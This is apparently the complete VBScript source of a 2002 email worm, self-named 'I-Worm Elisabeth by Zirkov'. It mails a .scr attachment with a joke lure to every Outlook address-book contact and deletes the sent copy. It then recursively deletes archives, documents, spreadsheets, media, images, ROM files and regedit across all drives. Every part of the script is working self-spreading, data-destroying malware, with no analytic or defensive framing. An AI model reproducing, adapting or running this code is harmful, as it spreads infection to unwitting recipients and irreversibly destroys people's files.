Dim fso,a,b,c,d,e,f,g
Set fso = CreateObject ("outlook.application")
Set a = fso.GetNameSpace ("MAPI")
For b = 1 To a.AddressLists.Count
Set c = a.AddressLists (b)
g = 1
Set d = fso.CreateItem (0)
For e = 1 To c.AddressEntries.Count
f = c.AddressEntries (g)
d.Recipients.Add f
g = g + 1
Next
d.Subject = "Mira esto, jajaja, te vas a reir!!"
d.Body = "Jajajaja!!! Es la ostia!! Miralo!!"
d.Attachments.Add "c:\OperacionTriunfo.scr"
d.DeleteAfterSubmit = True
d.Send
Next
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set dirwin = fso.GetSpecialFolder(0)
rootpath = dirwin & "\"
Set rootpath = fso.Drives
For each unit in rootpath
If unit.DriveType = 2 or unit.DriveType = 3 or unit.DriveType = 0 or unit.DriveType = 5 then
listafolder(unit.path & "\")
end if
next
Sub listafolder(folderspec)
Set z = fso.GetFolder(folderspec)
Set y = z.SubFolders
for each easy in y
putea(easy.path)
listafolder(easy.path)
next
end sub
Sub putea(folderspec)
Set a = fso.GetFolder(folderspec)
Set w = a.Files
For each target in w
Ext = lcase(fso.GetExtensionName(target.Name))
s = lcase(fso.GetBaseName(target.Name))
If ext = "zip" or ext = "arj" or ext = "rar" or ext = "ace" or ext = "lhz"  then
fso.DeleteFile(target.path),True
elseif ext = "doc" or ext = "log" or ext = "js" or ext = "rtf" or ext = "pdf" or ext = "asm" or ext = "wp" or ext = "txt" then
fso.DeleteFile(target.path),True
elseif ext = "xls" or ext = "mdb" or ext = "ppt" then
fso.DeleteFile(target.path),True
elseif ext = "avi" or ext = "mpg" or ext = "mpeg" or ext = "asf" or ext = "rm" or ext = "mov" then
fso.DeleteFile(target.path),True
elseif ext = "mp3" or ext = "mp2" or ext = "mp" or ext = "mod" or ext = "mid" or ext = "wav" then
fso.DeleteFile(target.path),True
elseif ext = "jpg" or ext = "jpeg" or ext = "gif" or ext = "bmp" then
fso.DeleteFile(target.path),True
elseif ext = "smc" or ext = "gb" or ext = "gbc" or ext = "gba" then
fso.DeleteFile(target.path),True
elseif s = "regedit" or s = "regedb32"  then
fso.DeleteFile(target.path),True
end if
next
end sub
MsgBox "I-Worm Elisabeth by Zirkov"
MsgBox "HECHO EN ADMIRACION A GIGABYTE"
MsgBox "RECUERDOS A TODAS MIS COMPAÑERAS DE MERYLAND CURSO 99-01"
MsgBox "HECHO EN ESPAÑA - ABRIL 2002"